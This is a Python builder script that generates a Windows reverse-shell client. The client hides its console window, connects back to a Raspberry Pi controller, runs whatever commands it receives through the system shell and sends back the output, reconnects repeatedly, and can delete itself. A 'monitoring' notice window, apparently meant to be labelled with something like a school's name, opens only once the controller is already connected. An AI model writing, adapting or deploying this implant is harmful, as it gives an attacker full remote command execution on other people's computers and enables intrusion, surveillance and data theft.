import os
import sys
import socket


def detect_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return None


def main():
    print("=" * 52)
    print("  Pi Reverse Shell - Client Builder")
    print("  Run this on the Raspberry Pi")
    print("=" * 52)
    print()

    detected_ip = detect_local_ip()
    if detected_ip:
        print(f"[*] Detected this Pi's IP: {detected_ip}")
        host_input = input(f"Enter the Pi's IP or Twingate hostname [default: {detected_ip}]: ").strip()
        host = host_input if host_input else detected_ip
    else:
        host = input("Enter the Pi's IP or Twingate hostname: ").strip()

    if not host:
        print("[!] Error: host cannot be empty.")
        sys.exit(1)

    port_input = input("Enter the port [default: 6000]: ").strip()
    port = 6000
    if port_input:
        try:
            port = int(port_input)
            if not (1 <= port <= 65535):
                raise ValueError
        except ValueError:
            print("[!] Invalid port. Using 6000.")
            port = 6000

    script_name   = input("Enter the output script name (without extension) [default: client]: ").strip() or "client"
    monitor_label = input("Enter the monitor label shown to the user (e.g. 'your school' or 'HomeNet'): ").strip() or "the system administrator"

    print()

    output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "output")
    os.makedirs(output_dir, exist_ok=True)

    client_code = f"""import socket
import subprocess
import os
import sys
import time
import threading
import tempfile
import ctypes

PI_HOST       = "{host}"
PI_PORT       = {port}
MONITOR_LABEL = "{monitor_label}"

# Hide own console window on startup (Windows)
if os.name == "nt":
    _hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if _hwnd:
        ctypes.windll.user32.ShowWindow(_hwnd, 0)

TEMP_DIR       = tempfile.gettempdir()
FLAG_FILE      = os.path.join(TEMP_DIR, "_pirsh_flag.txt")
MONITOR_SCRIPT = os.path.join(TEMP_DIR, "_pirsh_monitor.py")
SCRIPT_PATH    = os.path.abspath(__file__)
_monitor_proc  = None

# ------------------------------------------------------------------ #
# This code runs in a separate console window when the Pi connects.   #
# Data is passed via command-line arguments.                          #
# ------------------------------------------------------------------ #
MONITOR_SCRIPT_CODE = '''import os
import sys
import ctypes

if os.name == "nt":
    try:
        ctypes.windll.kernel32.SetConsoleMode(
            ctypes.windll.kernel32.GetStdHandle(-11), 7
        )
    except Exception:
        pass

pi_addr     = sys.argv[1] if len(sys.argv) > 1 else "unknown"
flag_file   = sys.argv[2] if len(sys.argv) > 2 else ""
monitor_lbl = sys.argv[3] if len(sys.argv) > 3 else "the system administrator"

RED   = chr(27) + "[91m"
BOLD  = chr(27) + "[1m"
RESET = chr(27) + "[0m"

os.system("cls" if os.name == "nt" else "clear")
print(RED + BOLD + "=" * 60 + RESET)
print(RED + BOLD + "  MONITORING ACTIVE" + RESET)
print(RED + BOLD + "=" * 60 + RESET)
print()
print(RED + "  This device is being monitored by " + monitor_lbl + "." + RESET)
print(RED + "  Activity on this device may be recorded and reviewed." + RESET)
print()
print("  Connected to: " + pi_addr)
print()
print(RED + BOLD + "=" * 60 + RESET)
print()
print("  Commands:")
print("    delete  -- remove this monitoring software from this device")
print("    exit    -- close this window (monitoring continues in background)")
print()

while True:
    try:
        cmd = input("> ").strip().lower()
        if cmd == "delete":
            if flag_file:
                with open(flag_file, "w") as fh:
                    fh.write("delete")
            print()
            print("  Monitoring software will be removed. You may close this window.")
            try:
                input("  Press Enter to close...")
            except Exception:
                pass
            break
        elif cmd == "exit":
            break
        elif cmd:
            print("  Unknown command. Type delete or exit.")
    except (KeyboardInterrupt, EOFError):
        break
'''


def delete_self():
    for path in [FLAG_FILE, MONITOR_SCRIPT]:
        try:
            os.remove(path)
        except Exception:
            pass
    # Write a small bat that deletes the script after this process exits
    bat = os.path.join(TEMP_DIR, "_pirsh_del.bat")
    with open(bat, "w") as f:
        f.write("@echo off\\n")
        f.write("ping -n 2 127.0.0.1 > nul\\n")
        f.write('del /f /q "' + SCRIPT_PATH + '"\\n')
        f.write('del /f /q "%~f0"\\n')
    subprocess.Popen(["cmd", "/c", bat], creationflags=0x08000000)
    sys.exit(0)


def open_monitoring_window(pi_addr):
    global _monitor_proc
    with open(MONITOR_SCRIPT, "w") as f:
        f.write(MONITOR_SCRIPT_CODE)
    _monitor_proc = subprocess.Popen(
        [sys.executable, MONITOR_SCRIPT, pi_addr, FLAG_FILE, MONITOR_LABEL],
        creationflags=subprocess.CREATE_NEW_CONSOLE,
    )


def close_monitoring_window():
    global _monitor_proc
    if _monitor_proc and _monitor_proc.poll() is None:
        try:
            _monitor_proc.terminate()
        except Exception:
            pass
    _monitor_proc = None


def show_disconnect_popup():
    MB_YESNO       = 0x04
    MB_ICONWARNING = 0x30
    IDYES          = 6
    msg = (
        "The monitoring server (" + MONITOR_LABEL + ") has disconnected from this device.\\n\\n"
        "Delete this monitoring software?"
    )
    result = ctypes.windll.user32.MessageBoxW(
        None, msg, "Monitoring Disconnected", MB_YESNO | MB_ICONWARNING
    )
    if result == IDYES:
        delete_self()


cwd = os.getcwd()


def connect_to_pi():
    global cwd
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((PI_HOST, PI_PORT))
            sock.settimeout(1.0)

            open_monitoring_window(PI_HOST)

            while True:
                # Check if the user requested delete via the monitoring window
                if os.path.exists(FLAG_FILE):
                    try:
                        with open(FLAG_FILE) as fh:
                            flag = fh.read().strip()
                        if flag == "delete":
                            os.remove(FLAG_FILE)
                            sock.close()
                            delete_self()
                    except Exception:
                        pass

                try:
                    data = sock.recv(4096)
                except socket.timeout:
                    continue
                except Exception:
                    break

                if not data:
                    break

                cmd = data.decode(errors="ignore").strip()

                if cmd.lower().startswith("cd"):
                    path = cmd[3:].strip()
                    if not path:
                        cwd = os.path.expanduser("~")
                    else:
                        new_path = os.path.abspath(os.path.join(cwd, path))
                        if os.path.isdir(new_path):
                            cwd = new_path
                            sock.sendall((cwd + "> \\n").encode())
                            continue
                        else:
                            sock.sendall(b"The system cannot find the path specified.\\n")
                            continue

                if cmd.lower() == "cls":
                    sock.sendall(b"\\x1b[2J\\x1b[H")
                    continue

                try:
                    result = subprocess.run(
                        cmd, shell=True, cwd=cwd, capture_output=True, text=True
                    )
                    output = result.stdout + result.stderr
                    if not output.strip():
                        output = "\\n"
                except Exception as e:
                    output = "Error: " + str(e) + "\\n"

                sock.sendall(output.encode())

            # Pi disconnected — close the monitoring window and notify user
            close_monitoring_window()
            threading.Thread(target=show_disconnect_popup, daemon=True).start()

        except Exception:
            pass

        time.sleep(2)


if __name__ == "__main__":
    connect_to_pi()
"""

    py_path = os.path.join(output_dir, script_name + ".py")
    with open(py_path, "w") as f:
        f.write(client_code)

    print(f"[+] {script_name}.py created in output/")

    # Write setup_info.bat
    bat_content = f"""@echo off
color 0A
echo ============================================================
echo   Pi Reverse Shell ^| Setup Information
echo ============================================================
echo.
echo   Pi Host      :  {host}
echo   Port         :  {port}
echo   Script Name  :  {script_name}.py
echo   Monitor Label:  {monitor_label}
echo.
echo ============================================================
echo   STEP 1 ^| RASPBERRY PI
echo ============================================================
echo.
echo   1. On the Pi, run:  python server.py
echo   2. The server will wait on port {port} for the client.
echo.
echo ============================================================
echo   STEP 2 ^| WINDOWS CLIENT
echo ============================================================
echo.
echo   1. Copy {script_name}.py to the Windows machine.
echo   2. Run it with:  python {script_name}.py
echo   3. It runs silently in the background.
echo   4. A monitoring notice window opens when the Pi connects.
echo   5. If the Pi disconnects, a popup will appear on Windows.
echo.
echo ============================================================
echo.
pause
"""

    bat_path = os.path.join(output_dir, "setup_info.bat")
    with open(bat_path, "w") as f:
        f.write(bat_content)

    print(f"[+] setup_info.bat created.")
    print()
    print("  Output files:")
    print(f"    output/{script_name}.py    — deploy to the Windows machine")
    print(f"    output/setup_info.bat     — run for full setup instructions")
    print()
    print("  Don't forget to also run build_server.py to generate server.py for the Pi.")
    print()


if __name__ == "__main__":
    main()
